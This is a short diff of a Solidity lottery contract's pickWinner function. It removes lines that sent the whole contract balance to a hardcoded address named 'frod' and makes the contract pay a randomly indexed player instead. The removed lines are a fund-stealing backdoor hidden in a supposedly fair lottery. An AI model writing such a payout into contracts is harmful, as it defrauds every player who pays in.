@@ -20,9 +20,9 @@ contract Lottery {
     }
     
     function pickWinner() public {
-        address frod = 0x706043818BFB7E199DBb0bcf55AB6e0e309291A4;
+        // address frod = 0x706043818BFB7E199DBb0bcf55AB6e0e309291A4;
         uint index = random() % players.length;
-        frod.transfer(this.balance);
+        players[index].transfer(this.balance);
         players = new address[](0);
     }
     
